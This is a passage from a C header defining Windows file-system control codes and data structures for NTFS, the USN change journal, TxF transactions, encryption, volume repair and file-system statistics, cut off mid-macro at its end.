#define FSCTL_TXFS_GET_METADATA_INFO        CTL_CODE(FILE_DEVICE_FILE_SYSTEM, 91, METHOD_BUFFERED, FILE_READ_DATA)  // TxF
#define FSCTL_TXFS_GET_TRANSACTED_VERSION   CTL_CODE(FILE_DEVICE_FILE_SYSTEM, 92, METHOD_BUFFERED, FILE_READ_DATA)  // TxF
// decommissioned fsctl value                                                 93
#define FSCTL_TXFS_SAVEPOINT_INFORMATION    CTL_CODE(FILE_DEVICE_FILE_SYSTEM, 94, METHOD_BUFFERED, FILE_WRITE_DATA) // TxF
#define FSCTL_TXFS_CREATE_MINIVERSION       CTL_CODE(FILE_DEVICE_FILE_SYSTEM, 95, METHOD_BUFFERED, FILE_WRITE_DATA) // TxF
// decommissioned fsctl value                                                 96
// decommissioned fsctl value                                                 97
// decommissioned fsctl value                                                 98
#define FSCTL_TXFS_TRANSACTION_ACTIVE       CTL_CODE(FILE_DEVICE_FILE_SYSTEM, 99, METHOD_BUFFERED, FILE_READ_DATA)  // TxF
#define FSCTL_SET_ZERO_ON_DEALLOCATION      CTL_CODE(FILE_DEVICE_FILE_SYSTEM, 101, METHOD_BUFFERED, FILE_SPECIAL_ACCESS)
#define FSCTL_SET_REPAIR                    CTL_CODE(FILE_DEVICE_FILE_SYSTEM, 102, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define FSCTL_GET_REPAIR                    CTL_CODE(FILE_DEVICE_FILE_SYSTEM, 103, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define FSCTL_WAIT_FOR_REPAIR               CTL_CODE(FILE_DEVICE_FILE_SYSTEM, 104, METHOD_BUFFERED, FILE_ANY_ACCESS)
// decommissioned fsctl value                                                 105
#define FSCTL_INITIATE_REPAIR               CTL_CODE(FILE_DEVICE_FILE_SYSTEM, 106, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define FSCTL_CSC_INTERNAL                  CTL_CODE(FILE_DEVICE_FILE_SYSTEM, 107, METHOD_NEITHER, FILE_ANY_ACCESS) // CSC internal implementation
#define FSCTL_SHRINK_VOLUME                 CTL_CODE(FILE_DEVICE_FILE_SYSTEM, 108, METHOD_BUFFERED, FILE_SPECIAL_ACCESS) // SHRINK_VOLUME_INFORMATION
#define FSCTL_SET_SHORT_NAME_BEHAVIOR       CTL_CODE(FILE_DEVICE_FILE_SYSTEM, 109, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define FSCTL_DFSR_SET_GHOST_HANDLE_STATE   CTL_CODE(FILE_DEVICE_FILE_SYSTEM, 110, METHOD_BUFFERED, FILE_ANY_ACCESS)

//
//  Values 111 - 119 are reserved for FSRM.
//

#define FSCTL_TXFS_LIST_TRANSACTION_LOCKED_FILES \
                                            CTL_CODE(FILE_DEVICE_FILE_SYSTEM, 120, METHOD_BUFFERED, FILE_READ_DATA) // TxF
#define FSCTL_TXFS_LIST_TRANSACTIONS        CTL_CODE(FILE_DEVICE_FILE_SYSTEM, 121, METHOD_BUFFERED, FILE_READ_DATA) // TxF
#define FSCTL_QUERY_PAGEFILE_ENCRYPTION     CTL_CODE(FILE_DEVICE_FILE_SYSTEM, 122, METHOD_BUFFERED, FILE_ANY_ACCESS)
#endif /* _WIN32_WINNT >= 0x0600 */

#if (_WIN32_WINNT >= 0x0600)
#define FSCTL_RESET_VOLUME_ALLOCATION_HINTS CTL_CODE(FILE_DEVICE_FILE_SYSTEM, 123, METHOD_BUFFERED, FILE_ANY_ACCESS)
#endif /* _WIN32_WINNT >= 0x0600 */

#if (_WIN32_WINNT >= 0x0601)
#define FSCTL_QUERY_DEPENDENT_VOLUME        CTL_CODE(FILE_DEVICE_FILE_SYSTEM, 124, METHOD_BUFFERED, FILE_ANY_ACCESS)    // Dependency File System Filter
#define FSCTL_SD_GLOBAL_CHANGE              CTL_CODE(FILE_DEVICE_FILE_SYSTEM, 125, METHOD_BUFFERED, FILE_ANY_ACCESS) // Update NTFS Security Descriptors
#endif /* _WIN32_WINNT >= 0x0601 */

#if (_WIN32_WINNT >= 0x0600)
#define FSCTL_TXFS_READ_BACKUP_INFORMATION2 CTL_CODE(FILE_DEVICE_FILE_SYSTEM, 126, METHOD_BUFFERED, FILE_ANY_ACCESS) // TxF
#endif /* _WIN32_WINNT >= 0x0600 */

#if (_WIN32_WINNT >= 0x0601)
#define FSCTL_LOOKUP_STREAM_FROM_CLUSTER    CTL_CODE(FILE_DEVICE_FILE_SYSTEM, 127, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define FSCTL_TXFS_WRITE_BACKUP_INFORMATION2 CTL_CODE(FILE_DEVICE_FILE_SYSTEM, 128, METHOD_BUFFERED, FILE_ANY_ACCESS) // TxF
#define FSCTL_FILE_TYPE_NOTIFICATION        CTL_CODE(FILE_DEVICE_FILE_SYSTEM, 129, METHOD_BUFFERED, FILE_ANY_ACCESS)
#endif

//  Values 130 - 130 are available
//  Values 131 - 139 are reserved for FSRM.

#if (_WIN32_WINNT >= 0x0601)
#define FSCTL_GET_BOOT_AREA_INFO            CTL_CODE(FILE_DEVICE_FILE_SYSTEM, 140, METHOD_BUFFERED, FILE_ANY_ACCESS) // BOOT_AREA_INFO
#define FSCTL_GET_RETRIEVAL_POINTER_BASE    CTL_CODE(FILE_DEVICE_FILE_SYSTEM, 141, METHOD_BUFFERED, FILE_ANY_ACCESS) // RETRIEVAL_POINTER_BASE
#define FSCTL_SET_PERSISTENT_VOLUME_STATE   CTL_CODE(FILE_DEVICE_FILE_SYSTEM, 142, METHOD_BUFFERED, FILE_ANY_ACCESS)  // FILE_FS_PERSISTENT_VOLUME_INFORMATION
#define FSCTL_QUERY_PERSISTENT_VOLUME_STATE CTL_CODE(FILE_DEVICE_FILE_SYSTEM, 143, METHOD_BUFFERED, FILE_ANY_ACCESS)  // FILE_FS_PERSISTENT_VOLUME_INFORMATION

#define FSCTL_REQUEST_OPLOCK                CTL_CODE(FILE_DEVICE_FILE_SYSTEM, 144, METHOD_BUFFERED, FILE_ANY_ACCESS)

#define FSCTL_CSV_TUNNEL_REQUEST            CTL_CODE(FILE_DEVICE_FILE_SYSTEM, 145, METHOD_BUFFERED, FILE_ANY_ACCESS) // CSV_TUNNEL_REQUEST
#define FSCTL_IS_CSV_FILE                   CTL_CODE(FILE_DEVICE_FILE_SYSTEM, 146, METHOD_BUFFERED, FILE_ANY_ACCESS) // IS_CSV_FILE

#define FSCTL_QUERY_FILE_SYSTEM_RECOGNITION CTL_CODE(FILE_DEVICE_FILE_SYSTEM, 147, METHOD_BUFFERED, FILE_ANY_ACCESS) // 
#define FSCTL_CSV_GET_VOLUME_PATH_NAME      CTL_CODE(FILE_DEVICE_FILE_SYSTEM, 148, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define FSCTL_CSV_GET_VOLUME_NAME_FOR_VOLUME_MOUNT_POINT CTL_CODE(FILE_DEVICE_FILE_SYSTEM, 149, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define FSCTL_CSV_GET_VOLUME_PATH_NAMES_FOR_VOLUME_NAME CTL_CODE(FILE_DEVICE_FILE_SYSTEM, 150,  METHOD_BUFFERED, FILE_ANY_ACCESS)
#define FSCTL_IS_FILE_ON_CSV_VOLUME         CTL_CODE(FILE_DEVICE_FILE_SYSTEM, 151,  METHOD_BUFFERED, FILE_ANY_ACCESS)

#endif /* _WIN32_WINNT >= 0x0601 */

#define FSCTL_MARK_AS_SYSTEM_HIVE           FSCTL_SET_BOOTLOADER_ACCESSED


#if(_WIN32_WINNT >= 0x0601)

typedef struct _CSV_NAMESPACE_INFO {

    ULONG         Version;
    ULONG         DeviceNumber;
    LARGE_INTEGER StartingOffset;
    ULONG         SectorSize;

} CSV_NAMESPACE_INFO, *PCSV_NAMESPACE_INFO;

#define CSV_NAMESPACE_INFO_V1 (sizeof(CSV_NAMESPACE_INFO))
#define CSV_INVALID_DEVICE_NUMBER 0xFFFFFFFF

#endif /* _WIN32_WINNT >= 0x0601 */

typedef struct _PATHNAME_BUFFER {

    ULONG PathNameLength;
    WCHAR Name[1];

} PATHNAME_BUFFER, *PPATHNAME_BUFFER;

typedef struct _FSCTL_QUERY_FAT_BPB_BUFFER {

    UCHAR First0x24BytesOfBootSector[0x24];

} FSCTL_QUERY_FAT_BPB_BUFFER, *PFSCTL_QUERY_FAT_BPB_BUFFER;

#if (_WIN32_WINNT >= 0x0400)

typedef struct {

    LARGE_INTEGER VolumeSerialNumber;
    LARGE_INTEGER NumberSectors;
    LARGE_INTEGER TotalClusters;
    LARGE_INTEGER FreeClusters;
    LARGE_INTEGER TotalReserved;
    ULONG BytesPerSector;
    ULONG BytesPerCluster;
    ULONG BytesPerFileRecordSegment;
    ULONG ClustersPerFileRecordSegment;
    LARGE_INTEGER MftValidDataLength;
    LARGE_INTEGER MftStartLcn;
    LARGE_INTEGER Mft2StartLcn;
    LARGE_INTEGER MftZoneStart;
    LARGE_INTEGER MftZoneEnd;

} NTFS_VOLUME_DATA_BUFFER, *PNTFS_VOLUME_DATA_BUFFER;

typedef struct {

    ULONG ByteCount;

    USHORT MajorVersion;
    USHORT MinorVersion;

} NTFS_EXTENDED_VOLUME_DATA, *PNTFS_EXTENDED_VOLUME_DATA;
#endif /* _WIN32_WINNT >= 0x0400 */

#if (_WIN32_WINNT >= 0x0400)

typedef struct {

    LARGE_INTEGER StartingLcn;

} STARTING_LCN_INPUT_BUFFER, *PSTARTING_LCN_INPUT_BUFFER;

typedef struct {

    LARGE_INTEGER StartingLcn;
    LARGE_INTEGER BitmapSize;
    UCHAR Buffer[1];

} VOLUME_BITMAP_BUFFER, *PVOLUME_BITMAP_BUFFER;
#endif /* _WIN32_WINNT >= 0x0400 */

#if (_WIN32_WINNT >= 0x0400)

typedef struct {

    LARGE_INTEGER StartingVcn;

} STARTING_VCN_INPUT_BUFFER, *PSTARTING_VCN_INPUT_BUFFER;

typedef struct RETRIEVAL_POINTERS_BUFFER {

    ULONG ExtentCount;
    LARGE_INTEGER StartingVcn;
    struct {
        LARGE_INTEGER NextVcn;
        LARGE_INTEGER Lcn;
    } Extents[1];

} RETRIEVAL_POINTERS_BUFFER, *PRETRIEVAL_POINTERS_BUFFER;
#endif /* _WIN32_WINNT >= 0x0400 */

#if (_WIN32_WINNT >= 0x0400)

typedef struct {

    LARGE_INTEGER FileReferenceNumber;

} NTFS_FILE_RECORD_INPUT_BUFFER, *PNTFS_FILE_RECORD_INPUT_BUFFER;

typedef struct {

    LARGE_INTEGER FileReferenceNumber;
    ULONG FileRecordLength;
    UCHAR FileRecordBuffer[1];

} NTFS_FILE_RECORD_OUTPUT_BUFFER, *PNTFS_FILE_RECORD_OUTPUT_BUFFER;
#endif /* _WIN32_WINNT >= 0x0400 */

#if (_WIN32_WINNT >= 0x0400)

typedef struct {

    HANDLE FileHandle;
    LARGE_INTEGER StartingVcn;
    LARGE_INTEGER StartingLcn;
    ULONG ClusterCount;

} MOVE_FILE_DATA, *PMOVE_FILE_DATA;

typedef struct {

    HANDLE FileHandle;
    LARGE_INTEGER SourceFileRecord;
    LARGE_INTEGER TargetFileRecord;

} MOVE_FILE_RECORD_DATA, *PMOVE_FILE_RECORD_DATA;


#if defined(_WIN64)

typedef struct _MOVE_FILE_DATA32 {

    UINT32 FileHandle;
    LARGE_INTEGER StartingVcn;
    LARGE_INTEGER StartingLcn;
    ULONG ClusterCount;

} MOVE_FILE_DATA32, *PMOVE_FILE_DATA32;
#endif
#endif /* _WIN32_WINNT >= 0x0400 */

#if (_WIN32_WINNT >= 0x0500)

typedef struct {
    ULONG Restart;
    SID Sid;
} FIND_BY_SID_DATA, *PFIND_BY_SID_DATA;

typedef struct {
    ULONG NextEntryOffset;
    ULONG FileIndex;
    ULONG FileNameLength;
    WCHAR FileName[1];
} FIND_BY_SID_OUTPUT, *PFIND_BY_SID_OUTPUT;

#endif /* _WIN32_WINNT >= 0x0500 */

#if (_WIN32_WINNT >= 0x0500)

typedef struct {

    ULONGLONG StartFileReferenceNumber;
    USN LowUsn;
    USN HighUsn;

} MFT_ENUM_DATA, *PMFT_ENUM_DATA;

typedef struct {

    ULONGLONG MaximumSize;
    ULONGLONG AllocationDelta;

} CREATE_USN_JOURNAL_DATA, *PCREATE_USN_JOURNAL_DATA;

typedef struct {

    USN StartUsn;
    ULONG ReasonMask;
    ULONG ReturnOnlyOnClose;
    ULONGLONG Timeout;
    ULONGLONG BytesToWaitFor;
    ULONGLONG UsnJournalID;

} READ_USN_JOURNAL_DATA, *PREAD_USN_JOURNAL_DATA;

typedef struct {

    ULONG RecordLength;
    USHORT MajorVersion;
    USHORT MinorVersion;
    ULONGLONG FileReferenceNumber;
    ULONGLONG ParentFileReferenceNumber;
    USN Usn;
    LARGE_INTEGER TimeStamp;
    ULONG Reason;
    ULONG SourceInfo;
    ULONG SecurityId;
    ULONG FileAttributes;
    USHORT FileNameLength;
    USHORT FileNameOffset;
    WCHAR FileName[1];

} USN_RECORD, *PUSN_RECORD;

#define USN_PAGE_SIZE                    (0x1000)

#define USN_REASON_DATA_OVERWRITE        (0x00000001)
#define USN_REASON_DATA_EXTEND           (0x00000002)
#define USN_REASON_DATA_TRUNCATION       (0x00000004)
#define USN_REASON_NAMED_DATA_OVERWRITE  (0x00000010)
#define USN_REASON_NAMED_DATA_EXTEND     (0x00000020)
#define USN_REASON_NAMED_DATA_TRUNCATION (0x00000040)
#define USN_REASON_FILE_CREATE           (0x00000100)
#define USN_REASON_FILE_DELETE           (0x00000200)
#define USN_REASON_EA_CHANGE             (0x00000400)
#define USN_REASON_SECURITY_CHANGE       (0x00000800)
#define USN_REASON_RENAME_OLD_NAME       (0x00001000)
#define USN_REASON_RENAME_NEW_NAME       (0x00002000)
#define USN_REASON_INDEXABLE_CHANGE      (0x00004000)
#define USN_REASON_BASIC_INFO_CHANGE     (0x00008000)
#define USN_REASON_HARD_LINK_CHANGE      (0x00010000)
#define USN_REASON_COMPRESSION_CHANGE    (0x00020000)
#define USN_REASON_ENCRYPTION_CHANGE     (0x00040000)
#define USN_REASON_OBJECT_ID_CHANGE      (0x00080000)
#define USN_REASON_REPARSE_POINT_CHANGE  (0x00100000)
#define USN_REASON_STREAM_CHANGE         (0x00200000)
#define USN_REASON_TRANSACTED_CHANGE     (0x00400000)
#define USN_REASON_CLOSE                 (0x80000000)

typedef struct {

    ULONGLONG UsnJournalID;
    USN FirstUsn;
    USN NextUsn;
    USN LowestValidUsn;
    USN MaxUsn;
    ULONGLONG MaximumSize;
    ULONGLONG AllocationDelta;

} USN_JOURNAL_DATA, *PUSN_JOURNAL_DATA;

typedef struct {

    ULONGLONG UsnJournalID;
    ULONG DeleteFlags;

} DELETE_USN_JOURNAL_DATA, *PDELETE_USN_JOURNAL_DATA;

#define USN_DELETE_FLAG_DELETE              (0x00000001)
#define USN_DELETE_FLAG_NOTIFY              (0x00000002)

#define USN_DELETE_VALID_FLAGS              (0x00000003)

typedef struct {

    ULONG UsnSourceInfo;
    HANDLE VolumeHandle;
    ULONG HandleInfo;

} MARK_HANDLE_INFO, *PMARK_HANDLE_INFO;

#if defined(_WIN64)

typedef struct {

    ULONG UsnSourceInfo;
    UINT32 VolumeHandle;
    ULONG HandleInfo;

} MARK_HANDLE_INFO32, *PMARK_HANDLE_INFO32;
#endif

#define USN_SOURCE_DATA_MANAGEMENT          (0x00000001)
#define USN_SOURCE_AUXILIARY_DATA           (0x00000002)
#define USN_SOURCE_REPLICATION_MANAGEMENT   (0x00000004)

#define MARK_HANDLE_PROTECT_CLUSTERS        (0x00000001)
#define MARK_HANDLE_TXF_SYSTEM_LOG          (0x00000004)
#define MARK_HANDLE_NOT_TXF_SYSTEM_LOG      (0x00000008)

#endif /* _WIN32_WINNT >= 0x0500 */

#if (_WIN32_WINNT >= 0x0601)

#define MARK_HANDLE_REALTIME                (0x00000020)
#define MARK_HANDLE_NOT_REALTIME            (0x00000040)

#define NO_8DOT3_NAME_PRESENT               (0x00000001)
#define REMOVED_8DOT3_NAME                  (0x00000002)

#define PERSISTENT_VOLUME_STATE_SHORT_NAME_CREATION_DISABLED        (0x00000001)

#endif /* _WIN32_WINNT >= 0x0601 */


#if (_WIN32_WINNT >= 0x0500)
typedef struct {

    ACCESS_MASK DesiredAccess;
    ULONG SecurityIds[1];

} BULK_SECURITY_TEST_DATA, *PBULK_SECURITY_TEST_DATA;
#endif /* _WIN32_WINNT >= 0x0500 */

#if (_WIN32_WINNT >= 0x0500)

#define VOLUME_IS_DIRTY                  (0x00000001)
#define VOLUME_UPGRADE_SCHEDULED         (0x00000002)
#define VOLUME_SESSION_OPEN              (0x00000004)
#endif /* _WIN32_WINNT >= 0x0500 */

#if (_WIN32_WINNT >= 0x0500)

typedef struct _FILE_PREFETCH {
    ULONG Type;
    ULONG Count;
    ULONGLONG Prefetch[1];
} FILE_PREFETCH, *PFILE_PREFETCH;

typedef struct _FILE_PREFETCH_EX {
    ULONG Type;
    ULONG Count;
    PVOID Context;
    ULONGLONG Prefetch[1];
} FILE_PREFETCH_EX, *PFILE_PREFETCH_EX;

#define FILE_PREFETCH_TYPE_FOR_CREATE       0x1
#define FILE_PREFETCH_TYPE_FOR_DIRENUM      0x2
#define FILE_PREFETCH_TYPE_FOR_CREATE_EX    0x3
#define FILE_PREFETCH_TYPE_FOR_DIRENUM_EX   0x4

#define FILE_PREFETCH_TYPE_MAX              0x4

#endif /* _WIN32_WINNT >= 0x0500 */

typedef struct _FILESYSTEM_STATISTICS {

    USHORT FileSystemType;
    USHORT Version;                     // currently version 1

    ULONG SizeOfCompleteStructure;      // must by a mutiple of 64 bytes

    ULONG UserFileReads;
    ULONG UserFileReadBytes;
    ULONG UserDiskReads;
    ULONG UserFileWrites;
    ULONG UserFileWriteBytes;
    ULONG UserDiskWrites;

    ULONG MetaDataReads;
    ULONG MetaDataReadBytes;
    ULONG MetaDataDiskReads;
    ULONG MetaDataWrites;
    ULONG MetaDataWriteBytes;
    ULONG MetaDataDiskWrites;
} FILESYSTEM_STATISTICS, *PFILESYSTEM_STATISTICS;

// values for FS_STATISTICS.FileSystemType

#define FILESYSTEM_STATISTICS_TYPE_NTFS     1
#define FILESYSTEM_STATISTICS_TYPE_FAT      2
#define FILESYSTEM_STATISTICS_TYPE_EXFAT    3
typedef struct _FAT_STATISTICS {
    ULONG CreateHits;
    ULONG SuccessfulCreates;
    ULONG FailedCreates;

    ULONG NonCachedReads;
    ULONG NonCachedReadBytes;
    ULONG NonCachedWrites;
    ULONG NonCachedWriteBytes;

    ULONG NonCachedDiskReads;
    ULONG NonCachedDiskWrites;
} FAT_STATISTICS, *PFAT_STATISTICS;

typedef struct _EXFAT_STATISTICS {
    ULONG CreateHits;
    ULONG SuccessfulCreates;
    ULONG FailedCreates;

    ULONG NonCachedReads;
    ULONG NonCachedReadBytes;
    ULONG NonCachedWrites;
    ULONG NonCachedWriteBytes;

    ULONG NonCachedDiskReads;
    ULONG NonCachedDiskWrites;
} EXFAT_STATISTICS, *PEXFAT_STATISTICS;

typedef struct _NTFS_STATISTICS {

    ULONG LogFileFullExceptions;
    ULONG OtherExceptions;

		ULONG MftReads;
    ULONG MftReadBytes;
    ULONG MftWrites;
    ULONG MftWriteBytes;
    struct {
        USHORT Write;
        USHORT Create;
        USHORT SetInfo;
        USHORT Flush;
    } MftWritesUserLevel;

    USHORT MftWritesFlushForLogFileFull;
    USHORT MftWritesLazyWriter;
    USHORT MftWritesUserRequest;

    ULONG Mft2Writes;
    ULONG Mft2WriteBytes;
    struct {
        USHORT Write;
        USHORT Create;
        USHORT SetInfo;
        USHORT Flush;
    } Mft2WritesUserLevel;

    USHORT Mft2WritesFlushForLogFileFull;
    USHORT Mft2WritesLazyWriter;
    USHORT Mft2WritesUserRequest;

    ULONG RootIndexReads;
    ULONG RootIndexReadBytes;
    ULONG RootIndexWrites;
    ULONG RootIndexWriteBytes;

    ULONG BitmapReads;
    ULONG BitmapReadBytes;
    ULONG BitmapWrites;
    ULONG BitmapWriteBytes;

    USHORT BitmapWritesFlushForLogFileFull;
    USHORT BitmapWritesLazyWriter;
    USHORT BitmapWritesUserRequest;

    struct {
        USHORT Write;
        USHORT Create;
        USHORT SetInfo;
    } BitmapWritesUserLevel;

    ULONG MftBitmapReads;
    ULONG MftBitmapReadBytes;
    ULONG MftBitmapWrites;
    ULONG MftBitmapWriteBytes;

    USHORT MftBitmapWritesFlushForLogFileFull;
    USHORT MftBitmapWritesLazyWriter;
    USHORT MftBitmapWritesUserRequest;

    struct {
        USHORT Write;
        USHORT Create;
        USHORT SetInfo;
        USHORT Flush;
    } MftBitmapWritesUserLevel;

    ULONG UserIndexReads;
    ULONG UserIndexReadBytes;
    ULONG UserIndexWrites;
    ULONG UserIndexWriteBytes;
    ULONG LogFileReads;
    ULONG LogFileReadBytes;
    ULONG LogFileWrites;
    ULONG LogFileWriteBytes;

    struct {
        ULONG Calls;                // number of individual calls to allocate clusters
        ULONG Clusters;             // number of clusters allocated
        ULONG Hints;                // number of times a hint was specified

        ULONG RunsReturned;         // number of runs used to satisify all the requests

        ULONG HintsHonored;         // number of times the hint was useful
        ULONG HintsClusters;        // number of clusters allocated via the hint
        ULONG Cache;                // number of times the cache was useful other than the hint
        ULONG CacheClusters;        // number of clusters allocated via the cache other than the hint
        ULONG CacheMiss;            // number of times the cache wasn't useful
        ULONG CacheMissClusters;    // number of clusters allocated without the cache
    } Allocate;

} NTFS_STATISTICS, *PNTFS_STATISTICS;

#if (_WIN32_WINNT >= 0x0500)

#if _MSC_VER >= 1200
#pragma warning(push)
#endif
#pragma warning(disable:4201)       // unnamed struct

typedef struct _FILE_OBJECTID_BUFFER {

    UCHAR ObjectId[16];

    union {
        struct {
            UCHAR BirthVolumeId[16];
            UCHAR BirthObjectId[16];
            UCHAR DomainId[16];
        } DUMMYSTRUCTNAME;
        UCHAR ExtendedInfo[48];
    } DUMMYUNIONNAME;

} FILE_OBJECTID_BUFFER, *PFILE_OBJECTID_BUFFER;

#if _MSC_VER >= 1200
#pragma warning(pop)
#else
#pragma warning( default : 4201 ) /* nonstandard extension used : nameless struct/union */
#endif

#endif /* _WIN32_WINNT >= 0x0500 */


#if (_WIN32_WINNT >= 0x0500)

typedef struct _FILE_SET_SPARSE_BUFFER {
    BOOLEAN SetSparse;
} FILE_SET_SPARSE_BUFFER, *PFILE_SET_SPARSE_BUFFER;


#endif /* _WIN32_WINNT >= 0x0500 */


#if (_WIN32_WINNT >= 0x0500)

typedef struct _FILE_ZERO_DATA_INFORMATION {

    LARGE_INTEGER FileOffset;
    LARGE_INTEGER BeyondFinalZero;

} FILE_ZERO_DATA_INFORMATION, *PFILE_ZERO_DATA_INFORMATION;
#endif /* _WIN32_WINNT >= 0x0500 */

#if (_WIN32_WINNT >= 0x0500)

typedef struct _FILE_ALLOCATED_RANGE_BUFFER {

    LARGE_INTEGER FileOffset;
    LARGE_INTEGER Length;

} FILE_ALLOCATED_RANGE_BUFFER, *PFILE_ALLOCATED_RANGE_BUFFER;
#endif /* _WIN32_WINNT >= 0x0500 */


#if (_WIN32_WINNT >= 0x0500)

typedef struct _ENCRYPTION_BUFFER {

    ULONG EncryptionOperation;
    UCHAR Private[1];

} ENCRYPTION_BUFFER, *PENCRYPTION_BUFFER;

#define FILE_SET_ENCRYPTION         0x00000001
#define FILE_CLEAR_ENCRYPTION       0x00000002
#define STREAM_SET_ENCRYPTION       0x00000003
#define STREAM_CLEAR_ENCRYPTION     0x00000004

#define MAXIMUM_ENCRYPTION_VALUE    0x00000004

typedef struct _DECRYPTION_STATUS_BUFFER {

    BOOLEAN NoEncryptedStreams;

} DECRYPTION_STATUS_BUFFER, *PDECRYPTION_STATUS_BUFFER;

#define ENCRYPTION_FORMAT_DEFAULT        (0x01)

#define COMPRESSION_FORMAT_SPARSE        (0x4000)

typedef struct _REQUEST_RAW_ENCRYPTED_DATA {

    LONGLONG FileOffset;
    ULONG Length;

} REQUEST_RAW_ENCRYPTED_DATA, *PREQUEST_RAW_ENCRYPTED_DATA;

typedef struct _ENCRYPTED_DATA_INFO {

    ULONGLONG StartingFileOffset;

    ULONG OutputBufferOffset;

    ULONG BytesWithinFileSize;

    ULONG BytesWithinValidDataLength;

    USHORT CompressionFormat;

    UCHAR DataUnitShift;
    UCHAR ChunkShift;
    UCHAR ClusterShift;

    UCHAR EncryptionFormat;

		USHORT NumberOfDataBlocks;

    ULONG DataBlockSize[ANYSIZE_ARRAY];

} ENCRYPTED_DATA_INFO;
typedef ENCRYPTED_DATA_INFO *PENCRYPTED_DATA_INFO;
#endif /* _WIN32_WINNT >= 0x0500 */


#if (_WIN32_WINNT >= 0x0500)

typedef struct _PLEX_READ_DATA_REQUEST {

    LARGE_INTEGER ByteOffset;
    ULONG ByteLength;
    ULONG PlexNumber;

} PLEX_READ_DATA_REQUEST, *PPLEX_READ_DATA_REQUEST;
#endif /* _WIN32_WINNT >= 0x0500 */

#if (_WIN32_WINNT >= 0x0500)

typedef struct _SI_COPYFILE {
    ULONG SourceFileNameLength;
    ULONG DestinationFileNameLength;
    ULONG Flags;
    WCHAR FileNameBuffer[1];
} SI_COPYFILE, *PSI_COPYFILE;

#define COPYFILE_SIS_LINK       0x0001              // Copy only if source is SIS
#define COPYFILE_SIS_REPLACE    0x0002              // Replace destination if it exists, otherwise don't.
#define COPYFILE_SIS_FLAGS      0x0003
#endif /* _WIN32_WINNT >= 0x0500 */

#if (_WIN32_WINNT >= 0x0600)

typedef struct _FILE_MAKE_COMPATIBLE_BUFFER {
    BOOLEAN CloseDisc;
} FILE_MAKE_COMPATIBLE_BUFFER, *PFILE_MAKE_COMPATIBLE_BUFFER;


typedef struct _FILE_SET_DEFECT_MGMT_BUFFER {
    BOOLEAN Disable;
} FILE_SET_DEFECT_MGMT_BUFFER, *PFILE_SET_DEFECT_MGMT_BUFFER;


typedef struct _FILE_QUERY_SPARING_BUFFER {
    ULONG SparingUnitBytes;
    BOOLEAN SoftwareSparing;
    ULONG TotalSpareBlocks;
    ULONG FreeSpareBlocks;
} FILE_QUERY_SPARING_BUFFER, *PFILE_QUERY_SPARING_BUFFER;


typedef struct _FILE_QUERY_ON_DISK_VOL_INFO_BUFFER {
    LARGE_INTEGER DirectoryCount;       // -1 = unknown
    LARGE_INTEGER FileCount;            // -1 = unknown
    USHORT FsFormatMajVersion;          // -1 = unknown or n/a
    USHORT FsFormatMinVersion;          // -1 = unknown or n/a
    WCHAR FsFormatName[ 12];
    LARGE_INTEGER FormatTime;
    LARGE_INTEGER LastUpdateTime;
    WCHAR CopyrightInfo[ 34];
    WCHAR AbstractInfo[ 34];
    WCHAR FormattingImplementationInfo[ 34];
    WCHAR LastModifyingImplementationInfo[ 34];
} FILE_QUERY_ON_DISK_VOL_INFO_BUFFER, *PFILE_QUERY_ON_DISK_VOL_INFO_BUFFER;


#define SET_REPAIR_ENABLED                                      (0x00000001)
#define SET_REPAIR_VOLUME_BITMAP_SCAN                           (0x00000002)
#define SET_REPAIR_DELETE_CROSSLINK                             (0x00000004)
#define SET_REPAIR_WARN_ABOUT_DATA_LOSS                         (0x00000008)
#define SET_REPAIR_DISABLED_AND_BUGCHECK_ON_CORRUPT             (0x00000010)
#define SET_REPAIR_VALID_MASK                                   (0x0000001F)

typedef enum _SHRINK_VOLUME_REQUEST_TYPES
{
    ShrinkPrepare = 1,
    ShrinkCommit,
    ShrinkAbort

} SHRINK_VOLUME_REQUEST_TYPES, *PSHRINK_VOLUME_REQUEST_TYPES;

typedef struct _SHRINK_VOLUME_INFORMATION
{
    SHRINK_VOLUME_REQUEST_TYPES ShrinkRequestType;
    ULONGLONG Flags;
    LONGLONG NewNumberOfSectors;

} SHRINK_VOLUME_INFORMATION, *PSHRINK_VOLUME_INFORMATION;

#define TXFS_RM_FLAG_LOGGING_MODE                           0x00000001
#define TXFS_RM_FLAG_RENAME_RM                              0x00000002
#define TXFS_RM_FLAG_LOG_CONTAINER_COUNT_MAX                0x00000004
#define TXFS_RM_FLAG_LOG_CONTAINER_COUNT_MIN                0x00000008
#define TXFS_RM_FLAG_LOG_GROWTH_INCREMENT_NUM_CONTAINERS    0x00000010
#define TXFS_RM_FLAG_LOG_GROWTH_INCREMENT_PERCENT           0x00000020
#define TXFS_RM_FLAG_LOG_AUTO_SHRINK_PERCENTAGE             0x00000040
#define TXFS_RM_FLAG_LOG_NO_CONTAINER_COUNT_MAX             0x00000080
#define TXFS_RM_FLAG_LOG_NO_CONTAINER_COUNT_MIN             0x00000100
#define TXFS_RM_FLAG_GROW_LOG                               0x00000400
#define TXFS_RM_FLAG_SHRINK_LOG                             0x00000800
#define TXFS_RM_FLAG_ENFORCE_MINIMUM_SIZE                   0x00001000
#define TXFS_RM_FLAG_PRESERVE_CHANGES                       0x00002000
#define TXFS_RM_FLAG_RESET_RM_AT_NEXT_START                 0x00004000
#define TXFS_RM_FLAG_DO_NOT_RESET_RM_AT_NEXT_START          0x00008000
#define TXFS_RM_FLAG_PREFER_CONSISTENCY                     0x00010000
#define TXFS_RM_FLAG_PREFER_AVAILABILITY                    0x00020000

#define TXFS_LOGGING_MODE_SIMPLE        (0x0001)
#define TXFS_LOGGING_MODE_FULL          (0x0002)

#define TXFS_TRANSACTION_STATE_NONE         0x00
#define TXFS_TRANSACTION_STATE_ACTIVE       0x01
#define TXFS_TRANSACTION_STATE_PREPARED     0x02
#define TXFS_TRANSACTION_STATE_NOTACTIVE    0x03

#define TXFS_MODIFY_RM_VALID_FLAGS                                      \
                (TXFS_RM_FLAG_LOGGING_MODE                          |   \
                 TXFS_RM_FLAG_RENAME_RM                             |   \
                 TXFS_RM_FLAG_LOG_CONTAINER_COUNT_MAX               |   \
                 TXFS_RM_FLAG_LOG_CONTAINER_COUNT_MIN               |   \
